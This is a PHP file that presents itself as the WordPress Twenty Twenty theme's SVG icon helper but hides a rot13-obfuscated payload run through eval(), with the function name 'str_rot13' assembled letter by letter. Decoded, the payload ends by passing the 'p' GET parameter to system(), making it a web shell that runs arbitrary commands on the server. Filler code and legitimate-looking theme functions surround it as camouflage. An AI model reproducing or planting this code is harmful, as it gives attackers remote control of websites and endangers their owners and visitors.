<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gjragl Gjragl FIT Vpba urycre shapgvbaf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl
 * @fvapr Gjragl Gjragl 1.0
 */

vs ( ! shapgvba_rkvfgf( 'gjraglgjragl_gur_gurzr_fit' ) ) {
	/**
	 * Bhgchg naq Trg Gurzr FIT.
	 * Bhgchg naq trg gur FIT znexhc sbe na vpba va gur GjraglGjragl_FIT_Vpbaf pynff.
	 *
	 * @fvapr Gjragl Gjragl 1.0
	 *
	 * @cnenz fgevat $fit_anzr Gur anzr bs gur vpba.
	 * @cnenz fgevat $tebhc    Gur tebhc gur vpba orybatf gb.
	 * @cnenz fgevat $pbybe    Pbybe pbqr.
	 */
	shapgvba gjraglgjragl_gur_gurzr_fit( $fit_anzr, $tebhc = 'hv', $pbybe = '' ) {
		rpub gjraglgjragl_trg_gurzr_fit( $fit_anzr, $tebhc, $pbybe ); // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq -- Rfpncrq va gjraglgjragl_trg_gurzr_fit().
	}
}

vs ( ! shapgvba_rkvfgf( 'gjraglgjragl_trg_gurzr_fit' ) ) {

	/**
	 * Trg vasbezngvba nobhg gur FIT vpba.
	 *
	 * @fvapr Gjragl Gjragl 1.0
	 *
	 * @cnenz fgevat $fit_anzr Gur anzr bs gur vpba.
	 * @cnenz fgevat $tebhc    Gur tebhc gur vpba orybatf gb.
	 * @cnenz fgevat $pbybe    Pbybe pbqr.
	 */
	shapgvba gjraglgjragl_trg_gurzr_fit( $fit_anzr, $tebhc = 'hv', $pbybe = '' ) {

		// Znxr fher gung bayl bhe nyybjrq gntf naq nggevohgrf ner vapyhqrq.
		$fit = jc_xfrf(
			GjraglGjragl_FIT_Vpbaf::trg_fit( $fit_anzr, $tebhc, $pbybe ),
			neenl(
				'fit'     => neenl(
					'pynff'       => gehr,
					'kzyaf'       => gehr,
					'jvqgu'       => gehr,
					'urvtug'      => gehr,
					'ivrjobk'     => gehr,
					'nevn-uvqqra' => gehr,
					'ebyr'        => gehr,
					'sbphfnoyr'   => gehr,
				),
				'cngu'    => neenl(
					'svyy'      => gehr,
					'svyy-ehyr' => gehr,
					'q'         => gehr,
					'genafsbez' => gehr,
				),
				'cbyltba' => neenl(
					'svyy'      => gehr,
					'svyy-ehyr' => gehr,
					'cbvagf'    => gehr,
					'genafsbez' => gehr,
					'sbphfnoyr' => gehr,
				),
			)
		);

		vs ( ! $fit ) {
			erghea snyfr;
		}
		erghea $fit;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>